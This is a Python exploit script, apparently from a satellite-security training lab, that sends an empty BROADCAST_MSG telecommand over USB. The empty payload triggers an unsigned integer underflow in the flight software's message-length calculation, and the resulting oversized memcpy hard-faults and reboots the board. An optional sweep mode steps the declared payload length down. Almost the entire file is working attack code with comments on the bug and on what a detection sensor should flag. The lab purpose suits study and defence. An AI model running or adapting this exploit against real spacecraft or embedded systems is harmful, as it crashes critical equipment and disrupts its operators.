#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# 01_fuzzing_crash_usb.py -- BROADCAST_MSG integer underflow, over USB.
#
#     worker.cpp:
#       size_t msg_len = payload_total - 2;      <- unsigned
#       memcpy(buffer_msg, space_packet->data + 2, msg_len);
#
# A payload that decrypts to zero octets makes that subtraction wrap to about
# 4.29 billion, and the memcpy runs. That is the entire exploit.
#
# The crash is in the payload parse, thirty lines before the radio is reached,
# so it behaves identically on the course build with the radio held in reset.
#
# Expected: the board hard-faults and reboots. The CDC port drops and
# re-enumerates a few seconds later, so this script's own connection does not
# survive -- watch the board's text console or PWNSAT-C3 (uptime back to 0).

import argparse
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))

from flatsat import FlatSat, TC_BROADCAST_MSG  # noqa: E402


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=None)
    ap.add_argument("--seq", type=int, default=1)
    ap.add_argument("--cleartext", action="store_true")
    ap.add_argument("--sweep", action="store_true",
                    help="walk the declared length down instead of one shot")
    args = ap.parse_args()

    print("[*] BROADCAST_MSG with a zero-octet payload.")
    print("[*] msg_len = payload_total - 2 underflows once this decrypts to nothing.")

    try:
        with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
            if args.sweep:
                print("\n=== walking the declared length down ===")
                for n, total in enumerate(range(12, -1, -1)):
                    print(f"    declared {total}")
                    fsat.send(TC_BROADCAST_MSG, b"\x00" * max(total, 0),
                              seq=(args.seq + n) & 0x3FFF, listen=0.4)
            else:
                fsat.send(TC_BROADCAST_MSG, b"", seq=args.seq, listen=1.0)
    except Exception as exc:                   # the crash can drop the port mid-write
        print(f"[+] the link died during the send ({type(exc).__name__}). "
              f"That is usually the fault, not an error in this script.")
        return 0

    print("\n[*] If the board is still answering, try --sweep, and watch the "
          "reboot counter in STATUS.")
    print("\nWhat the sensor should have shown: a declared length that does not "
          "match the frame,\nand a length below the header the application "
          "subtracts from it.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
